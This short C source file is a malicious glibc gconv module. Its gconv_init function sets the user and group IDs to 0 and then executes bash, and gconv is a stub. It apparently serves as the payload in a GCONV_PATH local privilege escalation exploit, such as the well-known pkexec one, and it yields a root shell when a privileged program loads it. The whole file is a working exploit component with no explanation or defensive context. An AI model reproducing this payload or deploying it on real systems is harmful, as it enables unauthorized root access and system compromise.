#define _GNU_SOURCE
#include <unistd.h>
#include <gconv.h>

int	gconv_init(void)
{
	char	*args[] = {
		"bash",
		NULL
	};
	char	*envp[] = {
		"PATH=/bin:/usr/bin:/sbin",
		NULL
	};

	setuid(0);
	setgid(0);
	execvpe("bin/bash", args, envp);
	return (__GCONV_OK);
}

int	gconv(void)
{
	return (__GCONV_OK);
}
